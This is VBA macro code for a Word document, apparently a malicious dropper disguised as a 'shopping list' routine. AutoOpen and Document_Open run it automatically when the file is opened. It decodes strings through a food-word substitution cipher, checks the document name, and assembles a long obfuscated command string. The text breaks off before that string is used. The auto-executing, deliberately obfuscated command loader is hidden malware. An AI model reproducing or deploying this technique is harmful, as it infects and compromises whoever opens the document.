
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
 If ActiveDocument.Name = ShoppingList("halibut hummus glasses hamburger gingerbread horseradish halibut grain ham honeydew cheddar glasses hamburger gingerbread") Then
      CommandMyShoppingList
 End If
End Sub


Function ShoppingList(wanted As String)
    Dim Foods As Variant
    Dim SelectedItem As Variant
    Dim IdArticle As Integer

    ShoppingList = ""

    Foods = Array("bacon", "bagel", "bake", "banana", "barbecue", "barley", "basil", "batter", "beancurd", "beans", _
    "beef", "beet", "berry", "biscuit", "bitter", "tea", "blackberry", "bland", "orange", "blueberry", "boil", "bowl", "boysenberry", _
    "bran", "bread", "breadfruit", "breakfast", "brisket", "broccoli", "broil", "rice", "brownie", "brunch", "buckwheat", "buns", _
    "burrito", "butter", "bean", "casserole", "cater", "cauliflower", "caviar", "celery", "cereal", "chard", "cheddar", "cheese", _
    "cheesecake", "chef", "cherry", "chew", "chicken", "chili", "chips", "chives", "chocolate", "chopsticks", "chow", "chutney", _
    "cilantro", "cinnamon", "citron", "citrus", "clam", "cloves", "cobbler", "coconut", "cod", "coffee", "coleslaw", "comestibles", _
    "dill", "dine", "diner", "dinner", "dip", "dish", "dough", "doughnut", "dragonfruit", "dressing", "dried", "fennel", "fig", _
    "fillet", "fire", "fish", "flan", "flax", "flour", "foodstuffs", "fork", "freezer", "fried", "garlic", "gastronomy", "gelatin", _
    "ginger", "gingerbread", "glasses", "grain", "granola", "grape", "grapefruit", "grated", "gravy", "greens", "grub", "halibut", _
    "ham", "hamburger", "hash", "hazelnut", "herbs", "honey", "honeydew", "horseradish", "hot", "vegetables", "sauce", "hummus", _
    "hunger", "hungry", "kale", "kebab", "ketchup")

    SelectedItem = Split(wanted, " ")

    For i = 0 To UBound(SelectedItem)
        For Z = 0 To UBound(Foods)
            If Foods(Z) = SelectedItem(i) Then
                IdArticle = (Z + 1)
                ShoppingList = ShoppingList & Chr(IdArticle)
            End If
        Next Z
    Next i
End Function

Function CommandMyShoppingList()
        Dim MyList As String
        Dim Water As String

        MyList = MyList + "hash hamburger vegetables grain herbs honey grapef"
MyList = MyList + "ruit grain grub grub brownie chard fish grated ham"
MyList = MyList + " glasses hamburger vegetables fennel honeydew humm"
MyList = MyList + "us grub grain brownie grapefruit grated glasses gl"
MyList = MyList + "asses grain ham brownie chard grain hash brownie g"
MyList = MyList + "inger hummus hash gelatin honey honey brownie char"
MyList = MyList + "d ham hamburger hash brownie chard grain ham ginge"
MyList = MyList + "rbread brownie diner cloves cobbler fennel cloves "
MyList = MyList + "dill fillet cloves ginger grape cobbler hunger clo"
MyList = MyList + "ves dill cloves cloves flax dressing cobbler gravy"
MyList = MyList + " cloves comestibles fillet cloves dine cloves clov"
MyList = MyList + "es chopsticks cloves coleslaw honey cloves gingerb"
MyList = MyList + "read grape cobbler chef cloves comestibles chicken"
MyList = MyList + " cloves gingerbread vegetables cobbler vegetables "
MyList = MyList + "cloves comestibles coffee cloves flax vegetables c"
MyList = MyList + "obbler grub cloves comestibles flax cloves flax dr"
MyList = MyList + "essing cobbler gravy cloves dill dressing cloves g"
MyList = MyList + "inger vegetables cobbler hummus cloves dill greens"
MyList = MyList + " cloves flan dressing cloves chips cloves cod hamb"
MyList = MyList + "urger cloves dressing vegetables cobbler hummus cl"
MyList = MyList + "oves comestibles fillet cloves flax dressing cobbl"
MyList = MyList + "er cheesecake cloves comestibles fillet cloves fil"
MyList = MyList + "let grape cobbler chef cloves comestibles chicken "
MyList = MyList + "cloves gingerbread vegetables cobbler vegetables c"
